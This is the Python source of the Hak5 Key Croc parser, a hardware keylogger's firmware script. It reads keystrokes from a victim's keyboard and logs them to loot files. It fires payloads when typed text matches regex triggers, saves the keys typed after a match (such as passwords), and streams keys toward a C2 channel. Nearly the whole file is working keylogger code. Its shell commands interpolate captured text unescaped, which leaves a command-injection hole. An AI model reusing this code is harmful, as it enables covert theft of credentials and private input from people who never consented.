#!/usr/bin/python
# Key Croc Parser
# (c) Hak5 2020
#
# Credits/props
# @0xdade - protected arming mode concept
# @0xdade - SAVEKEYS UNTIL concept

import os
import json
import sys
import collections
import re
import threading
import socket
import subprocess
import time
from datetime import datetime

IPC_HOST = '127.0.0.1'
IPC_PORT = 1337

RUNNING = True
STORAGE_FULL = False

########################
# Logger
########################
class Logger(object):
    def __init__(self,debug):
        self.debug = debug
        if self.debug:
            self.terminal = sys.stdout
            self.filename="/root/loot/croc_parser_debug.log"

    def write(self, message):
        if not self.debug:
            return

        self.terminal.write(message)
        self.terminal.flush()
        if STORAGE_FULL == True:
            return
        with open(self.filename, 'a') as f:
            f.write(message)
            f.flush()

########################
# IPC
########################
class server(threading.Thread):
    def __init__(self):
        super(server, self).__init__()
        self.sock = None
        self.conn = None
        self.connected = False
        self.out_buffer = []

    def send_to_c2(self,key):
        print "[!] to IPC " + key
        self.out_buffer.append(key)

    def send_msg(self,msg):
        if self.conn is not None:
            sent = self.conn.send(msg)
            if sent == 0:
                print "[!] IPC Connection lost"
                self.connected = False

    def stream(self):
        print "[!] IPC STREAM"
        if len(self.out_buffer) > 0:
            print "[+] sending buffer to c2"
            self.send_msg('.'+''.join(self.out_buffer))
            self.out_buffer = []
        else:
            # connection alive check hack because reasons
            self.send_msg('.')


    def stop_reading(self):
        print "[!] IPC SERVER STOP"
        global RUNNING
        RUNNING = False
        if self.sock is not None:
            try:
                  self.sock.shutdown(socket.SHUT_RDWR)
                  self.sock.close()
                  self.sock = None
                  print "[!] IPC server shutdown"
            except:
                  print "[!] IPC server shutdown failed"

    def run(self):
        while RUNNING:
              try:
                  print "[!] IPC Start"
                  self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                  self.sock.bind((IPC_HOST,IPC_PORT))
                  self.sock.listen(1)
                  print '[!] Listening for connections on port: {0}'.format(IPC_PORT)
                  self.conn, address = self.sock.accept()
                  print "[!] IPC CONNECTED"
                  self.connected = True
                  while self.connected:
                      time.sleep(2)
                      self.stream()
              except socket.error:
                  print '[!] IPC socket error'
                  self.connected = False

########################
# SAVEKEYS Model
########################
class SaveKeyTrigger:
    def __init__(self,output_file,save_type,p,class_callback):
        self.output_file = output_file
        self.save_type = save_type
        self.save_next_buffer = []
        self.save_next_filtered_buffer = []
        self.savekeys_param = p
        self.class_callback = class_callback

    def trigger(self,current_key_buffer):
        print "savekey trigger block begin"
        if ( self.save_type == "NEXT" ) or ( self.save_type == "UNTIL" ):
            self.class_callback.save_key_next_cache.append(self)
        elif (self.save_type == "LAST" ):
            if len(current_key_buffer) < self.savekeys_param:
                out = current_key_buffer
            else:
                out = current_key_buffer[-int(self.savekeys_param):]
            print "SAVEKEY LAST" + str(self.savekeys_param) + ":" + str(out)
            with open(self.output_file, 'a') as f:
                f.write(''.join(out)+"\n")
        print "savekey trigger block done"

    def __str__(self):
        param = self.savekeys_param
        if self.save_type == "UNTIL":
            param = self.savekeys_param.pattern
        return "SAVEKEYS " + self.output_file + " " + self.save_type + " " + str(param)

    def trigger_complete(self):
        print "SAVEKEYS BUFFER RESET"
        self.save_next_buffer = []
        self.save_next_filtered = []
        print "SAVEKEYS CACHE REMOVE CALLBACK"
        self.class_callback.trigger_complete(self)
        print "SAVEKEYS DONE"

    def save_keys_next_n(self,char):
        if ( len(self.save_next_buffer) >= self.savekeys_param ):
            print "SAVEKEYS NEXT LIMIT MET"
            self.done()
        else:
            print "ADD KEY TO SAVEKEYS NEXT TRIGGER"
            self.add_keystroke_to_buffers(char)

    def done(self):
        print "COMPLETING SAVEKEYS TRIGGER"
        self.write_out()
        self.trigger_complete()

    def add_keystroke_to_buffers(self,key):
        self.save_next_buffer.append(key)
        if ( key == "[BACKSPACE]" ):
            if len(self.save_next_filtered_buffer) > 0:
                self.save_next_filtered_buffer.pop()
        else:
            if not ( "[" in key and "[" != key ):
                self.save_next_filtered_buffer.append(key)

    def save_keys_until(self,char):
        search_results = self.savekeys_param.findall(''.join(self.save_next_buffer))
        if search_results:
            print "SAVEKEYS UNTIL MATCH FOUND"
            self.done()
            return
        else:
            search_results = self.savekeys_param.findall(''.join(self.save_next_filtered_buffer))
            if search_results:
                print "SAVEKEYS UNTIL (filtered) MATCH FOUND"
                self.done()
                return

        print "ADD KEY TO SAVEKEYS UNTIL TRIGGER"
        self.add_keystroke_to_buffers(char)


    def save_key(self,char):
        if ( self.save_type == "NEXT" ):
            self.save_keys_next_n(char)
        if ( self.save_type == "UNTIL" ):
            self.save_keys_until(char)

    def write_out(self):
        print "WRITING SAVEKEYS DATA"
        with open(self.output_file, 'a') as f:
            print "WRITING OUT SAVEKEYS BUFFER:" + ''.join(self.save_next_buffer)+"\n"
            f.write(''.join(self.save_next_buffer)+"\n")
        with open(self.output_file+".filtered", 'a') as f:
            print "WRITING OUT SAVEKEYS BUFFER:" + ''.join(self.save_next_filtered_buffer)+"\n"
            f.write(''.join(self.save_next_filtered_buffer)+"\n")
        print "SAVEKEYS DUMP DONE"

########################
# Payload Model
########################
class MatchPayload:
    def __init__(self,match_file):
        self.match_file = match_file;
        self.savekey_triggers = []

    def __str__(self):
        s = self.match_file.replace('/root/cache/','')
        #  s = "PAYLOAD FILE: " + self.match_file + "\n"
        #  s += "SAVEKEYS TRIGGERED BY THIS MATCH: " + "\n"
        #  for t in self.savekey_triggers:
        #      s += str(t) + "\n"
        return s

    def has_triggers(self):
        return len(self.savekey_triggers) > 0

    def savekey_triggers_to_str(self):
        print "Collecting SAVEKEYS paired to this MATCH"
        response = ""
        for trigger in self.savekey_triggers:
            response += str(trigger) + "\n"
        return response

    def trigger(self,current_key_buffer,match):
        print "match payload trigger block begin"
        if "DISABLED." in str(self):
            return
        print "[!] Match found - payload executing " + self.match_file

        new_file_name = "/tmp/" + self.match_file.split("/")[-1]
        payload_prep_command = "/bin/cat " +self.match_file+" | /bin/grep -v MATCH | /bin/grep -v SAVEKEYS > "+new_file_name
        try:
            print "Preparing payload"
            p = subprocess.Popen(payload_prep_command, shell=True)
        except:
            print "Unable to parse match payload into process"
            return

        notif_message = "Match found: " + "\'" + match + "\'" + "  -Payload executing: " + self.match_file
        notif_command = "/usr/bin/C2NOTIFY INFO '" + notif_message + "'"
        try:
            print "Sending notification to C2 if enabled"
            p = subprocess.Popen(notif_command, shell=True)
        except:
            print "Failed to send notification"

        try:
            print "Starting payload subprocess"
#*****************************************************************************************
            p = subprocess.Popen(["/bin/bash","-c",'source /usr/local/croc/bin/croc_framework;source /usr/local/croc/bin/GET_VARS;source /usr/local/croc/bin/GET;export DUCKY_LANG='+countrycode+';DUCKY_LANG='+countrycode+';LOOT="'+match+'";source '+new_file_name])
#*****************************************************************************************
        except:
            print "Unable to create new process for payload triggerd by match"
            return

        print "[!] Payload started " + self.match_file

        print "[!] Triggering Savekeys paired to this MATCH " + self.match_file
        for trigger in self.savekey_triggers:
            trigger.trigger(current_key_buffer)
        print "match payload trigger block done"
       

    def match_file(self):
        return self.match_file

    def add_trigger(self,trigger):
        self.savekey_triggers.append(trigger)

##################################
# Keyboard Input Manager Thread
##################################
class siphon(threading.Thread):
    def __init__(self,croc_callback):
        super(siphon, self).__init__()
        self.callback = croc_callback
        self.device = "/dev/hidraw0"

    def stop_reading(self):
        print "[!] Stopped listening for keystrokes"
        global RUNNING
        RUNNING = False
        self.terminate()

    def run(self):
        print "Listening for keystrokes.."
        while RUNNING:
            try:
                with open(self.device, "rb") as r:
                    # new input handling
                    rawbuf = r.read(8).encode("hex")
                    self.callback.add_keystroke_to_buffer(rawbuf)
            #except KeyboardInterrupt:
            #    print("[!] Siphon KeyboardInturrupt")
            #    self.stop_reading()
            except EnvironmentError:
                print("[!] Device is unavailable. Is there a keyboard plugged in?")
                time.sleep(0.5)

########################
# Main Parser Class
########################
class CrocParser:
    def parse_keymap(self,path):
        result = json.loads(open(path,"r").read(), object_pairs_hook=self.pairs_handler)
        #print "Decoded keymap:"
        #print result
        return result

    def pairs_handler(self,s):
        d = {}
        for k, v in s:
            if v not in d:
                d[v] = []
            if len(k) > 1:
                k = "[" +k+ "]"
            d[v].append(k)
            #print k + " added to " + v
            #print v + ":" + str(d[v])
        return d

    def __init__(self):
        self.croc_config_path = "/root/udisk/config.txt"
        self.debug_mode = False
        self.armingModePass = ""
        self.ARMING_MODE_PROTECTED = False
        self.armingModeTimeout = 0
        self.arming_regex = None
        self.servedArmingMode = False
        # Default US
        self.keymap_path = "/root/udisk/languages/us.json"
        #self.keyMap = self.parse_keymap(self.keymap_path)
        self.parse_croc_config()
        self.configure_protected_arming_mode()
        self.device = "/dev/hidraw0"
        # Input handling/buffers/paths
        self.keystroke_buffer = [] # key stroke stack from victim device - buffer pop()s from here
        self.pressedcache = [] # currently pressed cache to untangle/deduplicate the human error in typing
        # Output log buffers
        self.outbuffer = [] # output log buffer
        self.rawlog = [] # raw hex log buffer
        self.charlogbuffer = [] # character log buffer
        # Modifier handling
        self.modifier = "00" # currently pressed modifier
        self.modifierlabel = "" # currently pressed modifier label
        # Logging Handles + Paths
        self.outFilePath = "/root/loot/croc_char.log"
        self.outFileHandle = None
        self.rawOutFilePath = "/root/loot/croc_raw.log"
        self.rawOutFileHandle = None
        self.matchLogOutFilePath = "/root/loot/matches.log"
        self.matchLogOutFileHandle = None
        # Payload dir path
        self.matches_directory = "/root/cache"
        # Raw Char buffer to match against
        self.matchingbuffer = []
        # self.matchingbuffer with matches removed
        self.dedup_matchingbuffer = []
        # fitlered buffer to match against (handles backspaces + modifiers)
        self.filteredbuffer = []
        # fitleredbuffer with matches removed
        self.dedup_filteredbuffer = []
        # [{MatchPayload -> Compiled regex pattern obj}, ...]
        self.master_matches = []
        # move triggered MatchPayloads here that are saving future keys
        self.save_key_next_cache = []
        # Threads
        self.dumpThread = None
        self.server = None

    def enter_protected_arming_mode(self):
        try:
            if not self.servedArmingMode:
                if self.armingModeTimeout != 0:
                    command = ["/bin/bash", "-c", 'source /usr/local/croc/bin/croc_framework; WAIT_FOR_ARMING_MODE '+self.armingModeTimeout]
                    p = subprocess.Popen(command)
                    self.servedArmingMode = True
                else:
                    command = ["/bin/bash", "-c", 'source /usr/local/croc/bin/croc_framework; WAIT_FOR_ARMING_MODE']
                    p = subprocess.Popen(command)
                    self.servedArmingMode = True
            else:
                print "protected arming mode listener already started"
        except:
            print "Unable to enter arming mode"

    def arming_mode_fallback(self):
        try:
            if not self.servedArmingMode:
                print "Starting fallback arming mode listener"
                command = ["/bin/bash", "-c", 'source /usr/local/croc/bin/croc_framework; WAIT_FOR_ARMING_MODE']
                p = subprocess.Popen(command)
                self.servedArmingMode = True
                print "Started fallback arming mode listener"
            else:
                print "fallback arming mode listener already started"

        except:
            print "Unable to enter fallback arming mode"

    def configure_protected_arming_mode(self):
        print "CONFIGURING PROTECTED ARMING MODE"
        if not self.ARMING_MODE_PROTECTED:
            print "Framework is handling arming mode"
            return
        if self.armingModePass == "":
           print "INVALID ARMING MODE PASS"
           self.ARMING_MODE_PROTECTED = False
           self.arming_mode_fallback()
           return
        try:
           print "Compiling regex for protected arming mode"
           self.arming_regex = self.armingModePass
           rx = r'%s' % self.arming_regex.strip()
           ptrn = re.compile(rx)
           self.arming_regex = ptrn
           print "password regex compiled"
        except:
           self.ARMING_MODE_PROTECTED = False
           print "INVALID ARMING MODE PASS " + self.armingModePass
           self.arming_mode_fallback()

    def trigger_complete(self,trigger):
        print "SAVEKEY NEXT TRIGGER COMPLETE "+ str(trigger)
        self.save_key_next_cache.remove(trigger)
        print "REMOVE COMPLETE "

    def add_keystroke_to_buffer(self,data):
        self.keystroke_buffer.append(data)

    def debug_enabled(self):
        return self.debug_mode

    def stop_reading(self):
        print("\n[!] Stopping, Cleaning up")
        #global RUNNING
        #RUNNING = False
        self.dumpThread.cancel()
        self.server.stop_reading()
        #sys.exit(0)

    ############################
    # Startup Payload Parsing
    ############################
    def load_matches_from_disk(self):

        print 'Preparing root/cache'
        root_payload_dir_prep_command = "rm -rf /root/cache && mkdir /root/cache && cp -rf /root/udisk/payloads/* /root/cache/"
        try:
            p = subprocess.Popen(root_payload_dir_prep_command, shell=True)
            p.wait()
        except:
            print "Unable to create root payload directory"

        print 'Loading payloads copied from udisk to root/cache'
        path = self.matches_directory
        self.match_files = []
        for r, d, f in os.walk(path):
            for nf in f:
                if not nf[0] == '.':
                      print 'FILE FOUND ' + os.path.join(r,nf)
                      self.match_files.append(os.path.join(r, nf))
            break

        print "Parsing loaded payloads"
        for index in range(len(self.match_files)):
              current_match_regex = None
              with open(self.match_files[index]) as f:
                  current_match_payload_model = None
                  print 'Open Matching File:' + self.match_files[index]
                  for line in f:
                      # filter out comments
                      if line.startswith('#'):
                          continue
                      print 'Parse line:' + line.rstrip()
                      if line.startswith('MATCH'):
                          match_regex = line.split("MATCH ",1)[1]
                          print '\t {!} Detected Regex:' + match_regex.strip()
                          if ( match_regex == ""):
                             print "MATCH SYNTAX INVALID"
                             continue
                          rx = r'%s' % match_regex.strip()
                          try:
                            ptrn = re.compile(rx)
                          except:
                             print "MATCH REGEX SYNTAX INVALID"
                             continue
                          if current_match_regex is not None:
                              print 'new match line found, pushing old one to list, new SAVEKEYS triggers will be paired to this new match regex'
                              print '[+] Adding payload to list with regex:' + current_match_regex.pattern
                              self.master_matches.append({ current_match_payload_model: current_match_regex })
                              current_match_regex = ptrn
                              current_match_payload_model = MatchPayload(self.match_files[index])

                          if current_match_payload_model is None:
                              print 'CREATING NEW MATCH PAYLOAD MODEL'
                              current_match_payload_model = MatchPayload(self.match_files[index])
                              current_match_regex = ptrn

                      elif line.startswith("SAVEKEYS"):
                          params = line.split("SAVEKEYS ",1)[1]
                          each_param = params.split(" ")
                          output_path = each_param[0].strip()
                          savekeys_param = None
                          if ( output_path == "" ):
                              print "SAVEKEYS TRIGGER SYNTAX INVALID"
                              continue
                          trigger_type = each_param[1].strip()
                          if ( trigger_type == "" ):
                              print "SAVEKEYS TRIGGER SYNTAX INVALID"
                              continue
                          if ( trigger_type == "NEXT" ) or ( trigger_type == "LAST"):
                              char_count = each_param[2].strip()
                              if ( char_count == "" ):
                                  print "SAVEKEYS TRIGGER syntax invalid"
                                  continue
                              char_count = int(char_count)
                              if char_count > 256:
                                  print "SAVEKEYS TRIGGER MAX 256"
                                  char_count = 256
                              print '\t {!} Detected SAVEKEYS trigger:' +str(char_count)
                              savekeys_param = char_count
                          else: #UNTIL
                              regex = each_param[2].strip()
                              if ( regex == "" ):
                                  print "SAVEKEYS TRIGGER syntax invalid"
                                  continue
                              try:
                                  rx = r'%s' % regex
                                  ptrn = re.compile(rx)
                                  savekeys_param = ptrn
                                  print "SAVEKEYS UNTIL regex compiled"
                              except:
                                  continue

                              print '\t {!} Detected SAVEKEYS trigger:' +str(savekeys_param)

                          print 'CREATING NEW MATCH PAYLOAD SAVEKEYS TRIGGER'
                          new_trigger = SaveKeyTrigger(output_path,trigger_type,savekeys_param,self)

                          if current_match_payload_model is None:
                              print 'CREATING NEW MATCH PAYLOAD MODEL'
                              current_match_payload_model = MatchPayload(self.match_files[index])

                          print '[+] Adding SAVEKEYS trigger to Match Payload ' + str(new_trigger)
                          current_match_payload_model.add_trigger(new_trigger)

                  # All lines parsed, we should have at least a regex and a payload model out of it
                  if current_match_regex is not None and current_match_payload_model is not None:
                      print '[+] Adding payload to list with regex:' + current_match_regex.pattern
                      self.master_matches.append({ current_match_payload_model: current_match_regex })

        with open("/tmp/.payloads", "w") as myfile:
            myfile.write("")

        # done - summarize
        for item in self.master_matches:
            for payload_model,regex in item.items():
                print "-------------regex->payload pair start-----------"
                print regex.pattern
                print "\t\ttriggers->"
                print str(payload_model)
                print "-------------end-----------\n"
                with open("/tmp/.payloads", "a") as myfile:
                    myfile.write(str(payload_model) + " / " + regex.pattern+"\n")



    ########################
    # Runtime Match handling
    ########################
    def new_match(self,title,log,matchingbuffer,new_match_result,match_model):
        print "writing out match to matches.log"
        print log
        if match_model.has_triggers():
            log += match_model.savekey_triggers_to_str()
        with open(self.matchLogOutFilePath, 'a') as f:
            f.write(log)
        print "triggering paired savekeys"
        match_model.trigger(matchingbuffer,new_match_result)
        print "new match block done"

    def check_filtered_match(self,match_pattern,match_model):
        title = 'Filtered'
        new_match = False
        new_match_result = ""
        search_results = match_pattern.findall(''.join(self.dedup_filteredbuffer))
        log = ""
        now = datetime.now()
        if search_results:
            print title+"~~~~~~~RESULTS FOUND"+ str(len(search_results)) + str(search_results)
            for result in search_results:
                  print title+"~~~~~~~NEW MATCH"
                  new_match_result = result
                  log = now.strftime("%d/%m/%Y %H:%M:%S") + "[MATCH] " + result + " = " + match_pattern.pattern + " defined in " + match_model.match_file + " -- executing payload\n"
                  # always pass self.matchingbuffer rather than the param (never log filtered buffer)
                  print title+"~~~~~~~TRIGGERING PAYLOAD"
                  self.new_match(title,log,self.filteredbuffer,new_match_result,match_model)
                  print title+"~~~~~~~REMOVING MATCH FROM DEDUP BUFFER"
                  new_buff = ((''.join(self.dedup_filteredbuffer)).replace(new_match_result,''))
                  self.dedup_filteredbuffer = re.split(r'(\s+)', new_buff)
                  new_buff = ((''.join(self.dedup_matchingbuffer)).replace(new_match_result,''))
                  re.split(r'(\s+)', new_buff)
                  self.dedup_matchingbuffer = re.split(r'(\s+)', new_buff)

    def check_arming_mode(self):
        if not self.ARMING_MODE_PROTECTED:
            return
        title = 'Arming Mode'
        print "Checking for protected arming mode password match"
        new_match_result = ""
        search_results = self.arming_regex.findall(''.join(self.dedup_matchingbuffer))
        log = ""
        now = datetime.now()
        if search_results:
            print "PROTECTED ARMING MODE PASSWORD DETECTED"
            self.enter_protected_arming_mode()
            return
        else:
            print "PROTECTED ARMING MODE - no match detected "
            

    def check_match(self,match_pattern,match_model):
        title = 'Unfiltered'
        new_match = False
        new_match_result = ""
        search_results = match_pattern.findall(''.join(self.dedup_matchingbuffer))
        log = ""
        now = datetime.now()
        if search_results:
            print title+"~~~~~~~RESULTS FOUND"+ str(len(search_results)) + str(search_results)
            for result in search_results:
                  print title+"~~~~~~~NEW MATCH"
                  new_match_result = result
                  log = now.strftime("%d/%m/%Y %H:%M:%S") + "[MATCH] " + result + " = " + match_pattern.pattern + " defined in " + match_model.match_file + " -- executing payload\n"
                  # always pass self.matchingbuffer rather than the param (never log filtered buffer)
                  print title+"~~~~~~~TRIGGERING PAYLOAD"
                  self.new_match(title,log,self.matchingbuffer,new_match_result,match_model)
                  print title+"~~~~~~~REMOVING MATCH FROM DEDUP BUFFER"
                  new_buff = ((''.join(self.dedup_matchingbuffer)).replace(new_match_result,''))
                  self.dedup_matchingbuffer =  re.split(r'(\s+)', new_buff)
                  new_buff = ((''.join(self.dedup_filteredbuffer)).replace(new_match_result,''))
                  self.dedup_filteredbuffer = re.split(r'(\s+)', new_buff)
        else:
            # no match, try filtered
            print "no unfiltered match, checking filtered"
            self.check_filtered_match(match_pattern,match_model)

    def handle_key(self, key):
        # regular buffer containing all keys and modifiers
        # manage size of matching buffer
        # add to key to matching buffer
        if ( len(self.matchingbuffer) > 256 ):
            self.matchingbuffer.pop(0)
        self.matchingbuffer.append(key)

        # regular buffer containing all keys and modifiers with matches removed
        # manage size of dedup matching buffer
        # add to key to dedup matching buffer
        if ( len(self.dedup_matchingbuffer) > 256 ):
            self.dedup_matchingbuffer.pop(0)
        self.dedup_matchingbuffer.append(key)

        # for all currently running SAVEKEY ... NEXT N triggers, append this key to
        # the triggers buffer
        for trigger in self.save_key_next_cache:
            trigger.save_key(key)

        # filtered buffer
        # manage size of filtered buffer
        # add to key to filtered buffer
        if ( len(self.filteredbuffer) > 256 ):
            self.filteredbuffer.pop(0)

        # filtered buffer with matches removed
        # manage size of filtered buffer
        # add to key to filtered buffer
        if ( len(self.dedup_filteredbuffer) > 256 ):
            self.dedup_filteredbuffer.pop(0)

        # filter - cleanup filteredbuffer + dedup_filteredbuffer
        # remove last char if backspace was hit
        # todo consider: add a timeout to this to assume cursor movement 
        if ( key == "[BACKSPACE]" ):
            if len(self.filteredbuffer) > 0:
                self.filteredbuffer.pop()
            if len(self.dedup_filteredbuffer) > 0:
                self.dedup_filteredbuffer.pop()
        else:
            # add key to filteredbuffer and dedup_filtered buffer if not a modifier
            if not ( "[" in key and "[" != key ):
                self.filteredbuffer.append(key)
                self.dedup_filteredbuffer.append(key)

        # debug status
        print "\n"
        print('Raw Matching buffer: ' + ''.join(self.matchingbuffer))
        print('Dedup Raw Matching buffer: ' + ''.join(self.dedup_matchingbuffer))
        print('Filtered buffer: ' + ''.join(self.filteredbuffer))
        print('Dedup Filtered buffer: ' + ''.join(self.dedup_filteredbuffer))
        print "\n"

        self.check_arming_mode()
        # matching logic
        for i in self.master_matches:
            for match_model,match_pattern in i.items():
                self.check_match(match_pattern,match_model)

    def run_command(self,command):
        text = ""
        try:
            p = subprocess.Popen(command,stdout=subprocess.PIPE,shell=True)
            text = p.communicate()[0].strip()
        except Exception as e:
            print "Error running command: "+ command
            print e
        return text

    def storage_full(self):
        global STORAGE_FULL
        STORAGE_FULL = True
        self.run_command("LED Y")

    def check_storage(self):
        print("[*] Checking Storage Space")
        output = self.run_command("df -h|grep 'udisk'|awk '{print $5}'")
        print output
        if output == "100%":
            self.storage_full()


    ########################
    # Logging
    ########################
    def write_buffer_to_file(self):
        if RUNNING:
            self.dumpThread = threading.Timer(1.0, self.write_buffer_to_file)
            self.dumpThread.start()

        self.check_storage()
        if STORAGE_FULL == False:
            if len(self.charlogbuffer) > 0:
                with open(self.outFilePath, 'a') as self.outFileHandle:
                    self.outFileHandle.write(''.join(self.charlogbuffer).encode('utf-8'))
                self.charlogbuffer = []
            if len(self.rawlog) > 0:
                with open(self.rawOutFilePath, 'a') as self.rawOutFileHandle:
                    self.rawOutFileHandle.write('\n'.join(self.rawlog)+'\n')
                self.rawlog = []
        else:
            print("[*] ERROR STORAGE FULL CANNOT LOG TO DISK")


    def lookup_key(self, charkey):
        key = ""
        print "lookup: "+charkey
        if charkey in self.keyMap.iterkeys():
            key = self.keyMap[charkey]
            if isinstance(key, list):
               key = key[0]
        return key

    ########################
    # Key Input handling
    ########################
    def read_keys(self):
        self.write_buffer_to_file()
        self.server = server()
        self.server.start()
        while RUNNING:
            try:
                if len(self.keystroke_buffer) == 0:
                    time.sleep(0.05)
                else:
                    rawbuf = self.keystroke_buffer.pop(0)
                    cbuff = ','.join([rawbuf[i:i + 2] for i in xrange(0, len(rawbuf), 2)])
                    inputarr = cbuff.split(',')
                    self.rawlog.append(','.join(inputarr))

                    mod = inputarr[0]
                    del inputarr[0]

                    print("--------------")
                    print("New Data:")
                    print("mod:"+mod)
                    print(','.join(inputarr))
                    # handle newly released modifier keys
                    if len(inputarr) > 0:
                        if mod == "00" and self.modifier != mod:
                            print('\t [-] ' + inputarr[0] + ' modifier key released')
                            endkey = self.modifierlabel[:1] + "/" + self.modifierlabel[1:]
                            self.charlogbuffer.append(endkey)
                            self.modifier =  "00"
                            self.modifierlabel =  ""
                            self.pressedcache.append(inputarr[0])

                    # diff new keys to pressed cache finding released keys
                    for char in self.pressedcache:
                        if char not in inputarr:
                            print('\t [-] ' + char + ' key released')
                            self.pressedcache.remove(char)

                    if len(inputarr) > 0:
                        if mod and self.modifier != mod:
                            self.modifier =mod
                            charkey = mod + ",00,"+ inputarr[2]
                            lookup_result = self.lookup_key(charkey)
                            if lookup_result:
                                key = lookup_result
                                self.handle_key(key)
                                self.server.send_to_c2(key)
                                self.modifierlabel = key
                                self.charlogbuffer.append(key)
                                del inputarr[0]
                                self.pressedcache.append(mod)

                    # add new keys to pressed cache
                    for char in inputarr:
                        if char != "00":
                            if char not in self.pressedcache:
                                print('\t [+] ' + char + ' key is pressed')
                                self.pressedcache.append(char)
                                self.outbuffer.append(char)

                    # handle / parse completed keystrokes
                    for char in self.outbuffer:
                        if self.modifier != "":
                           charkey = self.modifier + ",00," + char

                        lookup_result = self.lookup_key(charkey)
                        if lookup_result:
                            key = lookup_result
                            self.charlogbuffer.append(key)
                            self.server.send_to_c2(key)
                            self.handle_key(key)
                        else:
                            print("UNIDENTIFIED KEY COMBO")

                    self.outbuffer = []
                    print('Char out buffer: ' + ''.join(self.charlogbuffer))

            except EnvironmentError:
                print("[!] Waiting for target keyboard")
                time.sleep(0.2)

    def parse_croc_config(self):
        if os.path.exists(self.croc_config_path):
              f = open(self.croc_config_path)
              for line in f:
                  if line.startswith("ARMING_PASS "):
                      opt = line.split("ARMING_PASS ",1)[1].strip()
                      print 'ARMING MODE PASS OPTION:' + opt
                      self.ARMING_MODE_PROTECTED = True
                      self.armingModePass = opt
                  elif line.startswith("ARMING_TIMEOUT "):
                      opt = line.split("ARMING_TIMEOUT ",1)[1].strip()
                      print 'ARMING MODE TIMEOUT OPTION:' + opt
                      self.armingModeTimeout = opt
                  elif line.startswith("DUCKY_LANG "):
#*****************************************************************************************
                      global countrycode
                      countrycode = line.split("DUCKY_LANG ",1)[1].strip().lower()
                      print "Countrycode: " + countrycode
                      default_lang_path = '/root/udisk/languages/'
                      opt = default_lang_path + countrycode + ".json"
#*****************************************************************************************
                      print 'DUCKY_LANG CONFIG OPTION: ' + opt
                      if os.path.exists(opt):
                          self.keymap_path = opt
                      else:
                          print "[!] No keymap found - Defaulting to US keymap"
                      self.keyMap = self.parse_keymap(self.keymap_path)


        else:
            print "[!] config.txt not found, defaulting to US keymap and regular matching/logging"

if __name__ == "__main__":
    DEBUG = False
    try:
          if "DEBUG" in sys.argv:
              DEBUG = True
          sys.stdout = Logger(DEBUG)
          croc = CrocParser()
          siphon = siphon(croc)
          siphon.start()
          croc.load_matches_from_disk()
          croc.read_keys()
    except KeyboardInterrupt:
          print("[!] KeyboardInterrupt, Exiting...")
          croc.stop_reading()
          try:
              sys.exit(0)
          except SystemExit:
              os._exit(0)
    except:
      print("[!] Parser Error, Exiting...")
      croc.stop_reading()
      try:
          sys.exit(1)
      except SystemExit:
          os._exit(1)
